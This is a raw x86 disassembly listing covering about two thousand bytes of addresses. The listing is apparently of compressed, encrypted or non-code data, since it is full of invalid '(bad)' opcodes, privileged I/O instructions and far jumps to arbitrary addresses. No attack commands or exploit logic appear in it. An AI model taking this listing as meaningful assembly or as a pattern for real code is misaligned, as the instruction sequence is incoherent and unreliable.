  41613e:	dec    esi
  41613f:	xchg   ebx,eax
  416140:	enter  0xa562,0xcb
  416144:	popa   
  416145:	mov    cl,0x0
  416147:	(bad)  
  416148:	into   
  416149:	jmp    0x257e0c49
  41614e:	out    dx,al
  41614f:	dec    ebp
  416150:	mov    eax,ds:0xf7754f1c
  416155:	mov    BYTE PTR ds:0x3605a636,bl
  41615b:	fsubr  QWORD PTR [ebp-0x45]
  41615e:	mov    ds:0x86725437,eax
  416163:	daa    
  416164:	pop    esp
  416165:	or     ah,0x97
  416168:	sub    BYTE PTR [edx-0x51],dl
  41616b:	out    dx,al
  41616c:	cld    
  41616d:	bound  eax,QWORD PTR cs:[edx]
  416170:	lods   eax,DWORD PTR ds:[esi]
  416171:	mov    dl,0x89
  416173:	sbb    eax,0x8182390f
  416178:	and    eax,0x79aeb691
  41617d:	sbb    eax,0xf3b241cd
  416182:	inc    esp
  416183:	stos   BYTE PTR es:[edi],al
  416184:	inc    ebp
  416185:	sub    BYTE PTR [eax+esi*4-0x4da2e6b6],al
  41618c:	out    0xba,al
  41618e:	scas   al,BYTE PTR es:[edi]
  41618f:	sti    
  416190:	outs   dx,DWORD PTR ds:[esi]
  416191:	out    dx,al
  416192:	sbb    DWORD PTR [ebp-0x528a1a9],edi
  416198:	pop    ecx
  416199:	idiv   BYTE PTR [ebx]
  41619b:	xor    BYTE PTR [ecx-0x1d],ch
  41619e:	aas    
  41619f:	sub    DWORD PTR [eax-0x59],ebx
  4161a2:	xchg   edx,eax
  4161a3:	sub    al,dl
  4161a5:	or     eax,ecx
  4161a7:	js     0x4161e7
  4161a9:	imul   esp,DWORD PTR [edx+0xd5a768],0xe0e7af4a
  4161b3:	ins    DWORD PTR es:[edi],dx
  4161b4:	(bad)  
  4161b5:	jmp    0x50f9:0xe91b855d
  4161bc:	retf   0x85b0
  4161bf:	lds    ebx,FWORD PTR [ebx]
  4161c1:	and    eax,edi
  4161c3:	leave  
  4161c4:	shr    DWORD PTR [ebp-0x72],cl
  4161c7:	fldcw  WORD PTR [eax-0x5a4bee43]
  4161cd:	fcomi  st,st(3)
  4161cf:	rcl    DWORD PTR [esi-0x2c82b7e9],1
  4161d5:	mov    eax,ds:0xbce65e9
  4161da:	fsubr  QWORD PTR [ebp+0x75]
  4161dd:	or     eax,0x561eed02
  4161e2:	cli    
  4161e3:	push   0x18842c9b
  4161e8:	xor    DWORD PTR [edi],edi
  4161ea:	xor    dl,BYTE PTR [eax-0x2bb2c086]
  4161f0:	hlt    
  4161f1:	mov    dh,0x1b
  4161f3:	addr16 push esp
  4161f5:	mov    ch,0xb
  4161f7:	lahf   
  4161f8:	push   ebp
  4161f9:	mov    esp,0xd0526ed5
  4161fe:	pop    es
  4161ff:	out    dx,eax
  416200:	or     DWORD PTR ds:0x14506d9e,eax
  416206:	push   cs
  416207:	iret   
  416208:	daa    
  416209:	ins    BYTE PTR es:[edi],dx
  41620a:	jg     0x4161c1
  41620c:	pop    ebx
  41620d:	push   ecx
  41620e:	fisttp DWORD PTR [ebp+0x15]
  416211:	cmp    BYTE PTR [ebx+esi*1-0x4b811905],cl
  416218:	aad    0x28
  41621a:	cmp    al,0x64
  41621c:	jle    0x416210
  41621e:	(bad)  
  416220:	and    ebp,DWORD PTR [eax-0x67a41671]
  416226:	pop    esp
  416227:	clc    
  416228:	fs jmp 0xc7c8480a
  41622e:	rol    BYTE PTR [ebx+ebp*8-0x27],cl
  416232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416233:	inc    ebp
  416234:	dec    esp
  416235:	adc    edx,DWORD PTR [esi]
  416237:	xchg   edx,ebp
  416239:	das    
  41623a:	lods   al,BYTE PTR ds:[esi]
  41623b:	mov    ecx,0x5fe49a76
  416240:	sbb    dl,al
  416242:	sti    
  416243:	test   ch,dh
  416245:	pushf  
  416246:	jmp    0xb7066d16
  41624b:	test   al,0xc6
  41624d:	retf   0x3d06
  416250:	mov    ds:0x6bb91ea3,eax
  416255:	jb     0x4162b6
  416257:	pop    esp
  416258:	sbb    BYTE PTR [edi+0x50],dl
  41625b:	mov    ebx,0xf235c639
  416260:	pusha  
  416261:	inc    ebp
  416262:	pusha  
  416263:	cdq    
  416264:	mov    esi,0xf90fa019
  416269:	aas    
  41626a:	and    DWORD PTR ds:0x323e8b0a,edx
  416270:	ins    BYTE PTR es:[edi],dx
  416271:	cmp    esp,ebp
  416273:	xchg   dh,al
  416275:	loopne 0x4162ae
  416277:	push   cs
  416278:	pop    edx
  416279:	in     al,0x9d
  41627b:	test   BYTE PTR [eax],bh
  41627d:	or     ebp,DWORD PTR [edi]
  41627f:	pop    ss
  416280:	fsub   DWORD PTR [esp+ebp*8]
  416284:	push   cs
  416285:	sahf   
  416286:	int    0x1a
  416288:	or     al,0x45
  41628a:	(bad)  
  41628b:	mov    ds:0x1a16ba1e,eax
  416290:	add    ebx,DWORD PTR [esi-0x734a2b56]
  416296:	sub    ebx,DWORD PTR [ebx+0x47]
  416299:	lock js 0x416284
  41629c:	call   0xbb10:0x618816bc
  4162a3:	jp     0x41630e
  4162a5:	jge    0x41623a
  4162a7:	pop    edx
  4162a8:	inc    ebp
  4162a9:	adc    DWORD PTR [edi],ebx
  4162ab:	pop    esp
  4162ac:	cwde   
  4162ad:	jne    0x416268
  4162af:	dec    esi
  4162b0:	dec    ebp
  4162b1:	xchg   ebp,eax
  4162b2:	mov    edi,ecx
  4162b4:	xchg   ebp,eax
  4162b5:	push   0xc6bf6cca
  4162ba:	(bad)  
  4162bb:	std    
  4162bc:	or     eax,0xad86b8c5
  4162c1:	cmp    DWORD PTR [ebp+0x491bbee],0x5b
  4162c8:	sbb    ch,bh
  4162ca:	test   DWORD PTR [edi+edi*2+0x2c6c40d2],ecx
  4162d1:	or     ch,BYTE PTR fs:[ebp+0x11ac3e0]
  4162d8:	fisubr WORD PTR [ebx+0x3e]
  4162db:	fld    DWORD PTR [ecx+0x4af5b05]
  4162e1:	pop    ds
  4162e2:	imul   esp,DWORD PTR [ebx-0x3c],0x3b
  4162e6:	mov    bh,0x35
  4162e8:	or     DWORD PTR [ecx+0x4d],esp
  4162eb:	in     eax,0x1e
  4162ed:	cld    
  4162ee:	xchg   ebx,eax
  4162ef:	mov    ch,0x20
  4162f1:	mov    ah,BYTE PTR [ebx-0x6b]
  4162f4:	and    DWORD PTR [eax+ebp*8+0x734ae89],0x7e
  4162fc:	hlt    
  4162fd:	out    0x3b,al
  4162ff:	add    al,0x3c
  416301:	push   gs
  416303:	(bad)  
  416304:	cmp    ecx,DWORD PTR [esi-0x5a2d05c8]
  41630a:	icebp  
  41630b:	aaa    
  41630c:	xchg   ebp,eax
  41630d:	scas   eax,DWORD PTR es:[edi]
  41630e:	cli    
  41630f:	(bad)  
  416311:	out    dx,al
  416312:	dec    eax
  416313:	pop    ebx
  416314:	fcomp  DWORD PTR [ecx-0x80]
  416317:	outs   dx,BYTE PTR ds:[esi]
  416318:	xor    eax,0x91efb1db
  41631d:	jo     0x4162b0
  41631f:	lahf   
  416320:	push   ecx
  416321:	sub    al,0x21
  416323:	dec    esi
  416324:	jmp    DWORD PTR [edx+0x3638b359]
  41632a:	addr16 loopne 0x4162ea
  41632d:	je     0x4162bc
  41632f:	leave  
  416330:	jecxz  0x416392
  416332:	add    al,0x55
  416334:	es mov eax,0xe7edce46
  41633a:	fcmovb st,st(0)
  41633c:	or     BYTE PTR [ebp+0x7d34f158],ch
  416342:	push   edi
  416343:	daa    
  416344:	or     al,0x75
  416346:	test   BYTE PTR [esi+esi*2-0x50593bd8],dl
  41634d:	xchg   ebp,eax
  41634e:	retf   
  41634f:	out    0xf4,al
  416351:	sub    ebp,ebp
  416353:	and    eax,0xb87ab862
  416358:	cmc    
  416359:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41635a:	pop    ebp
  41635b:	dec    ebx
  41635c:	mov    ds:0x75ada5e2,eax
  416361:	inc    ecx
  416362:	nop
  416363:	imul   BYTE PTR [ebx+ebx*1-0x38fd94d5]
  41636a:	fimul  WORD PTR [ebx]
  41636c:	adc    BYTE PTR [eax-0x44],al
  41636f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416370:	pop    ebp
  416371:	popa   
  416372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416373:	ja     0x41638e
  416375:	xor    ebx,DWORD PTR [edx]
  416377:	adc    edx,DWORD PTR [bx+si-0x2f]
  41637b:	ins    DWORD PTR es:[edi],dx
  41637c:	adc    eax,0x84082dbb
  416381:	mov    esp,0x4b678797
  416386:	ret    
  416387:	ret    
  416388:	mov    ch,bh
  41638a:	jge    0x416363
  41638c:	retf   0xaa36
  41638f:	test   BYTE PTR [ebp-0x42],cl
  416392:	or     DWORD PTR ds:0x4bb49cec,ebx
  416398:	push   edx
  416399:	push   ds
  41639a:	lock pcmpgtd mm0,QWORD PTR [edx+esi*1-0x3123a2b]
  4163a3:	sbb    ah,BYTE PTR [edi]
  4163a5:	mov    ch,0xc2
  4163a7:	inc    ecx
  4163a8:	jns    0x41634f
  4163aa:	ss clc 
  4163ac:	xor    eax,0x5eebbe34
  4163b1:	clc    
  4163b2:	jl     0x4163ca
  4163b4:	dec    eax
  4163b5:	adc    BYTE PTR [eiz*1+0x2f901903],al
  4163bc:	jns    0x4163db
  4163be:	lods   al,BYTE PTR ds:[esi]
  4163bf:	jb     0x4163e1
  4163c1:	and    al,0x4e
  4163c3:	xchg   edx,eax
  4163c4:	enter  0x12d2,0x2e
  4163c8:	jge    0x4163f9
  4163ca:	cmp    DWORD PTR [edi+ecx*4+0x60],ebx
  4163ce:	jge    0x4163f8
  4163d0:	and    al,0x75
  4163d2:	mov    al,0x51
  4163d4:	push   ss
  4163d5:	nop
  4163d6:	cmp    al,0x60
  4163d8:	pop    ss
  4163d9:	sub    dh,ah
  4163db:	nop
  4163dc:	pop    ss
  4163dd:	imul   esi,DWORD PTR [ebx],0x2c
  4163e0:	push   0xb2817eb4
  4163e5:	hlt    
  4163e6:	es push ss
  4163e8:	in     al,0xc3
  4163ea:	(bad)  
  4163eb:	shl    BYTE PTR [edi+ecx*1+0x54f5ff60],cl
  4163f2:	clc    
  4163f3:	sbb    DWORD PTR [edx],edi
  4163f5:	xchg   ebp,eax
  4163f6:	add    cl,ch
  4163f8:	(bad)  
  4163fa:	sub    BYTE PTR [edi-0x37],ah
  4163fd:	stc    
  4163fe:	add    edi,DWORD PTR [esi+0xa9de368]
  416404:	sub    eax,0x3e72fb63
  416409:	loope  0x416480
  41640b:	cmp    al,0x3c
  41640d:	fwait
  41640e:	add    eax,0xc31ddf68
  416413:	out    dx,eax
  416414:	adc    al,0x4a
  416416:	adc    eax,0x1dae1f2
  41641b:	icebp  
  41641c:	cli    
  41641d:	pop    esi
  41641e:	and    BYTE PTR ds:0xc155129a,0x4a
  416425:	neg    DWORD PTR [ebx+0x63038ce2]
  41642b:	fsubr  DWORD PTR [ebx-0x2a]
  41642e:	add    BYTE PTR [edx-0x1567f532],0xd6
  416435:	bound  ebp,QWORD PTR [esi]
  416437:	xchg   BYTE PTR [esi-0x13],bh
  41643a:	sub    DWORD PTR [edi+0x2a2721aa],edx
  416440:	dec    edi
  416441:	out    dx,eax
  416442:	cmp    edx,edi
  416444:	add    DWORD PTR [ebx-0x47d079b9],ebx
  41644a:	xchg   ebx,eax
  41644b:	imul   eax,DWORD PTR [edi],0xffffffdc
  41644e:	data16 sbb cl,BYTE PTR [edx+edi*8+0xe68ad07]
  416456:	(bad)  [esi]
  416458:	int    0x94
  41645a:	loope  0x416424
  41645c:	cmp    esi,DWORD PTR [esi-0x219e8610]
  416462:	xchg   ebx,eax
  416463:	xor    BYTE PTR [esi-0x1],ch
  416466:	aad    0x84
  416468:	push   esp
  416469:	inc    ebp
  41646a:	scas   eax,DWORD PTR es:[edi]
  41646b:	rcr    DWORD PTR [ecx+0x1a],cl
  41646e:	dec    edi
  41646f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416470:	loopne 0x41642d
  416472:	leave  
  416473:	fld    QWORD PTR [ebp+0x76]
  416476:	push   0xffffffb6
  416478:	aam    0x89
  41647a:	pop    edx
  41647b:	js     0x4164ee
  41647d:	cmp    DWORD PTR [eax+ecx*4-0x8518423],ebx
  416484:	or     bh,ah
  416486:	mov    al,ds:0xae95a8de
  41648b:	sti    
  41648c:	aad    0x24
  41648e:	mov    al,0x74
  416490:	push   esp
  416491:	sbb    BYTE PTR ds:0xf91ccc79,dl
  416497:	bound  ebx,QWORD PTR [ebp+0xbc06c0a]
  41649d:	data16 mov al,0xc6
  4164a0:	mov    ebx,0x1406a7cc
  4164a5:	cmp    bh,BYTE PTR [ebp+esi*2-0x48e1f9b4]
  4164ac:	push   ss
  4164ad:	inc    eax
  4164ae:	mov    bl,0xbc
  4164b0:	pop    edx
  4164b1:	jmp    0x4164d6
  4164b3:	adc    ecx,DWORD PTR [eax]
  4164b5:	sbb    ebx,edi
  4164b7:	scas   eax,DWORD PTR es:[edi]
  4164b8:	inc    ecx
  4164b9:	sbb    al,0xa1
  4164bb:	push   edx
  4164bc:	pop    es
  4164bd:	cmp    eax,0x1f6c6d
  4164c2:	push   eax
  4164c3:	leave  
  4164c4:	sub    al,0x68
  4164c6:	push   ds
  4164c7:	outs   dx,DWORD PTR ds:[esi]
  4164c8:	jp     0x4164ab
  4164ca:	mov    dl,ah
  4164cc:	(bad)  
  4164cd:	adc    BYTE PTR [edx+0x11],dl
  4164d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164d1:	mov    esi,0xe5fe9ce9
  4164d6:	mov    bh,0x3b
  4164d8:	xor    bh,BYTE PTR [ebx-0x52]
  4164db:	push   esi
  4164dc:	and    eax,0x9f392c19
  4164e1:	(bad)
  4164e5:	dec    ecx
  4164e6:	pop    ss
  4164e7:	test   al,0xe5
  4164e9:	addr16 pop ss
  4164eb:	dec    edi
  4164ec:	cmp    eax,0x45718a6a
  4164f1:	xor    ah,BYTE PTR fs:[ebx+esi*2-0x52]
  4164f6:	cmp    BYTE PTR [esi+0x59aa12f9],bh
  4164fc:	shl    BYTE PTR [esi-0xbcea759],0x5a
  416503:	iret   
  416504:	inc    ecx
  416505:	jns    0x4164b9
  416507:	stos   BYTE PTR es:[edi],al
  416508:	hlt    
  416509:	xchg   ebp,eax
  41650a:	jp     0x416549
  41650c:	xchg   edi,eax
  41650d:	pop    ecx
  41650e:	dec    ecx
  41650f:	mov    ch,ch
  416511:	lock cdq 
  416513:	mov    esi,0xe23485d7
  416518:	jmp    0xd0ab7d82
  41651d:	cmp    edx,DWORD PTR [eax+0x48656b82]
  416523:	dec    DWORD PTR [edx+eax*8+0x2527a044]
  41652a:	push   esp
  41652b:	mov    dh,0x8a
  41652d:	cmp    DWORD PTR [edi+0x41],eax
  416530:	adc    al,0xb0
  416532:	mov    eax,ds:0xfe4cdb90
  416537:	into   
  416538:	jg     0x416526
  41653a:	xor    DWORD PTR [ebp-0xe678701],edi
  416540:	mov    al,ds:0xb7800e11
  416545:	push   0xc7ece512
  41654a:	repnz and dl,BYTE PTR [ebx-0x36cb834d]
  416551:	inc    esi
  416552:	push   edi
  416553:	push   esp
  416554:	stos   DWORD PTR es:[edi],eax
  416555:	loope  0x416562
  416557:	dec    ecx
  416558:	in     al,dx
  416559:	cli    
  41655a:	push   esi
  41655b:	push   cs
  41655c:	and    ch,ah
  41655e:	test   al,0x88
  416560:	push   esi
  416561:	in     eax,0x8b
  416563:	mov    edx,0x4a2125c
  416568:	fldenv [ecx+0x42]
  41656b:	sbb    BYTE PTR [ebp+esi*1-0x4e],ah
  41656f:	das    
  416570:	cmp    eax,0xcd5c3e60
  416575:	addr16 push 0xffffffff
  416578:	ja     0x416552
  41657a:	xchg   ebp,eax
  41657b:	or     ah,BYTE PTR [edx]
  41657d:	cmp    DWORD PTR [edx],edi
  41657f:	push   ss
  416580:	mov    bh,0xe3
  416582:	ins    DWORD PTR es:[edi],dx
  416583:	sub    al,0xed
  416585:	adc    BYTE PTR [ecx],cl
  416587:	sbb    ecx,DWORD PTR [edi]
  416589:	ss jo  0x4165c0
  41658c:	mov    DWORD PTR [eax],esi
  41658e:	or     eax,0x33465e36
  416593:	pop    ecx
  416594:	inc    edi
  416595:	leave  
  416596:	je     0x416524
  416598:	jnp    0x4165ec
  41659a:	push   0xffffff8c
  41659c:	(bad)  
  41659d:	xchg   BYTE PTR [edx],bh
  41659f:	dec    edx
  4165a0:	out    0x33,eax
  4165a2:	xchg   esp,eax
  4165a3:	mov    bl,BYTE PTR [eax+ebx*2]
  4165a6:	cld    
  4165a7:	jmp    0x4165f6
  4165a9:	xor    ebx,edx
  4165ab:	sub    dh,BYTE PTR [ecx+ebp*4]
  4165ae:	imul   edi,esi,0x76e90079
  4165b4:	lds    esi,FWORD PTR [edx]
  4165b6:	cwde   
  4165b7:	mov    esi,DWORD PTR [edx+eiz*8+0x15bd1942]
  4165be:	push   edx
  4165bf:	sbb    DWORD PTR [esi+ebx*1-0x17c20ab0],ebp
  4165c6:	pop    ebp
  4165c7:	scas   eax,DWORD PTR es:[edi]
  4165c8:	std    
  4165c9:	xlat   BYTE PTR ds:[ebx]
  4165ca:	rol    DWORD PTR [ebx+0xf1bfbfb],1
  4165d0:	loopne 0x4165d7
  4165d2:	and    cl,BYTE PTR [ebx]
  4165d4:	enter  0x47ab,0xa4
  4165d8:	adc    eax,0x969e3189
  4165dd:	ficomp DWORD PTR [edx]
  4165df:	ficomp WORD PTR [ecx-0x9]
  4165e3:	imul   ebx,DWORD PTR [ebx],0xbb5010ce
  4165e9:	gs pop esp
  4165eb:	push   edi
  4165ec:	jmp    0xd25d:0xabcb23bf
  4165f3:	pop    esi
  4165f4:	jecxz  0x4165a0
  4165f6:	shl    BYTE PTR [esi-0x3c0969b8],1
  4165fc:	push   0x5
  4165fe:	push   ecx
  4165ff:	mov    dh,0xa6
  416601:	jg     0x4165f3
  416603:	jns    0x416602
  416605:	ss loopne 0x416642
  416608:	pushf  
  416609:	dec    esi
  41660a:	pop    esi
  41660b:	sbb    ebx,edx
  41660d:	or     al,0x83
  41660f:	enter  0xbbad,0x81
  416613:	out    0x5d,eax
  416615:	lods   eax,DWORD PTR ds:[esi]
  416616:	enter  0x72bd,0x2d
  41661a:	inc    ebp
  41661b:	daa    
  41661c:	add    DWORD PTR [edi-0x7b],edi
  41661f:	(bad)  
  416620:	pop    ds
  416621:	arpl   WORD PTR [ebx+0x1c5b89ae],bp
  416627:	inc    esp
  416628:	lahf   
  416629:	bound  edi,QWORD PTR [esi-0x6401e71f]
  41662f:	js     0x416674
  416631:	adc    BYTE PTR [ecx],dh
  416633:	mov    dh,BYTE PTR [edx+0xf1e484f]
  416639:	mov    BYTE PTR [ecx-0x2fe98b5e],dl
  41663f:	add    BYTE PTR [ecx-0x714cea28],bl
  416645:	pushf  
  416646:	scas   al,BYTE PTR es:[edi]
  416647:	xchg   ecx,eax
  416648:	pop    ecx
  416649:	fisubr WORD PTR [eax]
  41664b:	les    edi,FWORD PTR [esi+ebp*8+0x62f50d69]
  416652:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416653:	fwait
  416654:	lock adc edi,DWORD PTR [edi-0x4e]
  416658:	inc    edi
  416659:	dec    edi
  41665a:	mov    ebp,0xa76f5f91
  41665f:	ret    
  416660:	push   ss
  416661:	sbb    dl,0x40
  416664:	push   esi
  416665:	or     dh,bl
  416667:	xor    eax,0x5430deaf
  41666c:	lock sbb esp,DWORD PTR [edx-0x440083f4]
  416673:	xchg   ecx,ebp
  416675:	lods   eax,DWORD PTR ds:[esi]
  416676:	stos   BYTE PTR es:[edi],al
  416677:	hlt    
  416678:	and    al,0x52
  41667a:	scas   eax,DWORD PTR es:[edi]
  41667b:	and    BYTE PTR [edx+0x34f50498],ah
  416681:	pop    es
  416682:	push   ebx
  416683:	in     al,0x2b
  416685:	fcomp  st(0)
  416687:	sbb    DWORD PTR [ebx+edx*4],esi
  41668a:	test   eax,0x4d97a209
  41668f:	add    al,0x40
  416691:	jns    0x416662
  416693:	adc    edx,DWORD PTR [ebp-0xb9715d5]
  416699:	add    BYTE PTR [esi+0x5d5915de],cl
  41669f:	cmp    al,0xc
  4166a1:	adc    eax,0xddd2ee91
  4166a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166a7:	and    eax,0xe1e1d53c
  4166ac:	pop    ebx
  4166ad:	hlt    
  4166ae:	xchg   edx,eax
  4166af:	(bad)  
  4166b0:	call   0x5dde:0xd96a2419
  4166b7:	mov    ebp,0x8c057e24
  4166bc:	sbb    ebp,ebx
  4166be:	dec    ebp
  4166bf:	not    BYTE PTR [eax-0xd]
  4166c2:	and    DWORD PTR [ebx+ebp*2+0x74705082],edi
  4166c9:	fdiv   DWORD PTR [edi-0x7b]
  4166cd:	pop    ecx
  4166ce:	xor    al,0xf3
  4166d0:	pop    ebx
  4166d1:	add    DWORD PTR [ebx],ebp
  4166d3:	inc    ebx
  4166d4:	or     eax,0xfd27b673
  4166d9:	inc    edx
  4166da:	mov    esp,0x53db8f7e
  4166df:	inc    ebp
  4166e0:	jb     0x4166ef
  4166e2:	les    eax,FWORD PTR [eax]
  4166e4:	xchg   edi,eax
  4166e5:	jnp    0x416689
  4166e7:	fidivr WORD PTR [ebx]
  4166e9:	pop    esi
  4166ea:	jns    0x4166aa
  4166ec:	and    eax,0x7547b487
  4166f1:	ds xor ch,bl
  4166f4:	sub    bl,bh
  4166f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166f7:	mov    eax,0x80cce4c9
  4166fc:	adc    eax,0xff5b9b8b
  416701:	mov    ecx,0x8deccf31
  416706:	inc    esi
  416707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416708:	xchg   esi,eax
  416709:	dec    ebx
  41670a:	adc    DWORD PTR [esp+ecx*8-0x43],0x603efd94
  416712:	inc    edi
  416713:	xor    ebx,DWORD PTR [ebp+0x428890ef]
  416719:	jl     0x41673c
  41671b:	cld    
  41671c:	cmp    ah,BYTE PTR [edi]
  41671e:	add    BYTE PTR [ebx+0x6a],ah
  416721:	int    0x1d
  416723:	fidiv  WORD PTR [edi+0x7e]
  416726:	stc    
  416727:	mov    ds:0x2f87f504,eax
  41672c:	or     eax,0x829a4b76
  416731:	pop    esi
  416732:	leave  
  416733:	in     al,dx
  416734:	push   esp
  416735:	in     al,0x8d
  416737:	push   esp
  416738:	inc    eax
  416739:	mov    ebx,0x77c97961
  41673e:	pusha  
  41673f:	jmp    0x1669:0x71a04735
  416746:	jae    0x4167c5
  416748:	lea    ecx,[edx+0x68]
  41674b:	outs   dx,BYTE PTR ds:[esi]
  41674c:	nop
  41674d:	xchg   edi,eax
  41674e:	(bad)  
  41674f:	xchg   ecx,eax
  416750:	or     edi,DWORD PTR [ecx]
  416752:	xchg   ebp,eax
  416753:	lods   al,BYTE PTR ds:[esi]
  416754:	lock pop edx
  416756:	add    ah,BYTE PTR [edx+0x3]
  416759:	dec    esp
  41675a:	jp     0x4166ee
  41675c:	shl    esp,1
  41675e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41675f:	pop    ss
  416760:	mov    ch,0x9b
  416762:	lods   al,BYTE PTR ds:[esi]
  416763:	dec    edx
  416764:	pop    esp
  416765:	mov    dl,0xe6
  416767:	popa   
  416768:	inc    dh
  41676a:	add    al,0x5e
  41676c:	aas    
  41676d:	sbb    al,0x68
  41676f:	pop    edi
  416770:	fnsave [ebp+0x6647bce8]
  416776:	sti    
  416777:	rol    DWORD PTR [esi-0x49f3a367],cl
  41677d:	ins    DWORD PTR es:[edi],dx
  41677e:	ffree  st(5)
  416780:	(bad)  
  416781:	stc    
  416782:	ins    DWORD PTR es:[edi],dx
  416783:	les    esp,FWORD PTR [ebp+0x7]
  416786:	fisubr DWORD PTR [esi+0x17fe1663]
  41678c:	stos   DWORD PTR es:[edi],eax
  41678d:	aas    
  41678e:	daa    
  41678f:	and    BYTE PTR [edx+eiz*4+0x47ca09ab],dh
  416796:	imul   edx,esi,0x59
  416799:	dec    ebp
  41679a:	and    bl,al
  41679c:	fidivr WORD PTR [edi+0x8]
  41679f:	add    BYTE PTR [edx],cl
  4167a1:	mov    ds:0x99d25738,eax
  4167a6:	ficom  WORD PTR [esi-0x7545212]
  4167ac:	ds push esi
  4167ae:	xor    dh,BYTE PTR [edi+0x28]
  4167b1:	jle    0x416744
  4167b3:	dec    edi
  4167b4:	push   ebp
  4167b5:	cld    
  4167b6:	xchg   edx,eax
  4167b7:	(bad)  
  4167b8:	popf   
  4167b9:	clc    
  4167ba:	xchg   esi,eax
  4167bb:	and    eax,0x51fd1b80
  4167c0:	lods   eax,DWORD PTR ds:[esi]
  4167c1:	and    cl,BYTE PTR [esi-0x7e]
  4167c4:	(bad)  
  4167c5:	std    
  4167c6:	ins    DWORD PTR es:[edi],dx
  4167c7:	leave  
  4167c8:	xchg   esp,eax
  4167c9:	push   ebp
  4167ca:	push   0xffffffbf
  4167cc:	lods   al,BYTE PTR ds:[esi]
  4167cd:	and    ebp,DWORD PTR [edi]
  4167cf:	cmp    BYTE PTR [edi],bh
  4167d1:	xor    BYTE PTR [eax-0x593db427],al
  4167d7:	mov    al,0xc0
  4167d9:	inc    ebx
  4167da:	mov    esi,0x1733247
  4167df:	xchg   esp,eax
  4167e0:	adc    ebx,ebp
  4167e2:	cmp    dl,BYTE PTR [eax+edx*2]
  4167e5:	push   ss
  4167e6:	pop    eax
  4167e7:	ss nop
  4167e9:	adc    eax,0x9fb29764
  4167ee:	lds    edi,FWORD PTR [edi]
  4167f0:	mov    esp,0xf0680ee1
  4167f5:	inc    ecx
  4167f6:	cmp    BYTE PTR [edx+0xc],al
  4167f9:	cmp    eax,0x9fbebf1d
  4167fe:	xor    esp,DWORD PTR [bp+di]
  416801:	sub    ebx,DWORD PTR [edi+0x32]
  416804:	scas   al,BYTE PTR es:[edi]
  416805:	daa    
  416806:	fist   DWORD PTR [ebx+0x63]
  416809:	inc    ebp
  41680a:	lods   eax,DWORD PTR ds:[esi]
  41680b:	xchg   edx,eax
  41680c:	bound  ebx,QWORD PTR [eax+ebp*1+0x50]
  416810:	mov    eax,ds:0xe2a7587d
  416815:	mov    cl,0x1e
  416817:	mov    cl,0xcc
  416819:	(bad)  
  41681a:	mov    ebp,0x10ce297f
  41681f:	call   0x2f5b34b6
  416824:	dec    edi
  416825:	cmp    DWORD PTR [eax-0x2a2246f8],0xe2db13b
  41682f:	sub    edx,DWORD PTR [esi-0x6a]
  416832:	mov    bh,bh
  416834:	(bad)  
  416835:	and    al,0x90
  416837:	push   edx
  416838:	enter  0xe49,0x4f
  41683c:	mov    esi,0xa8618e9b
  416841:	(bad)  
  416842:	leave  
  416843:	jns    0x4167f6
  416845:	aaa    
  416846:	popa   
  416847:	loope  0x41686d
  416849:	mov    ebx,0x9eb7842e
  41684e:	repnz cmp BYTE PTR [ebx-0x1f],cl
  416852:	push   eax
  416853:	sub    al,0xd4
  416855:	ja     0x4167f9
  416857:	xor    ebp,DWORD PTR [edi+0x1815f858]
  41685d:	outs   dx,BYTE PTR ds:[esi]
  41685e:	and    BYTE PTR [edi+edi*1-0x18b93adc],0xfe
  416866:	pop    esi
  416867:	push   ebp
  416868:	cmp    al,0xdd
  41686a:	ins    DWORD PTR es:[edi],dx
  41686b:	scas   eax,DWORD PTR es:[edi]
  41686c:	and    eax,0xd672715b
  416871:	fisttp WORD PTR [edi]
  416873:	enter  0x512b,0x7c
  416877:	les    esp,FWORD PTR [edx+0x27408f25]
  41687d:	push   ss
  41687e:	aam    0xa7
  416880:	mov    ah,0xa5
  416882:	inc    esp
  416883:	fist   WORD PTR [esi+0x3f]
  416886:	addr16 xchg esi,eax
  416888:	sub    BYTE PTR [esi],al
  41688a:	push   esi
  41688b:	xchg   edx,eax
  41688c:	jp     0x4168de
  41688e:	push   esi
  41688f:	mov    esp,0x5332c9d
  416894:	adc    esi,DWORD PTR [ecx+0x350cee75]
  41689a:	sahf   
  41689b:	lods   al,BYTE PTR ds:[esi]
  41689c:	ins    BYTE PTR es:[edi],dx
  41689d:	cmp    bl,bh
  41689f:	es test al,0x91
  4168a2:	jp     0x416909
  4168a4:	or     ah,cl
  4168a6:	xchg   esp,eax
  4168a7:	lahf   
  4168a8:	xchg   esp,eax
  4168a9:	jg     0x4168da
  4168ab:	jge    0x416841
  4168ad:	rcr    BYTE PTR [ebx+0x49],cl
  4168b0:	sub    esp,ebp
  4168b2:	stc    
  4168b3:	fdivr  DWORD PTR [ecx]
  4168b5:	xor    edx,esi
  4168b7:	mov    ebx,0x44440ba2
  4168bc:	dec    ebx
  4168bd:	ss or  eax,0x4d1fedb8
  4168c3:	mov    ah,0x8a
  4168c5:	lahf   
  4168c6:	mov    dh,0x8a
  4168c8:	xor    al,0x65
  4168ca:	jg     0x416883
  4168cc:	inc    eax
  4168cd:	aam    0x14
  4168cf:	(bad)  
  4168d0:	mov    bl,0xa0
  4168d2:	inc    ebp
  4168d3:	mov    dl,0x38
  4168d5:	jecxz  0x4168d0
  4168d7:	xor    eax,0xf5b20e0a
  4168dc:	cs call 0x2b60cc91
  4168e2:	rcr    DWORD PTR [esi],0xa3
  4168e5:	(bad)  
  4168e6:	or     al,0xf3
  4168e8:	call   0x88407317
  4168ed:	lahf   
  4168ee:	jne    0x4168af
  4168f0:	test   BYTE PTR [ecx],bl
  4168f2:	pushw  ss
  4168f4:	pop    esi
  4168f5:	xchg   esp,eax
  4168f6:	sbb    ecx,esp
  4168f8:	jmp    0x58dd9f2d
  4168fd:	(bad)  
  4168fe:	jns    0x4168a4
  416900:	pop    eax
  416901:	(bad)  
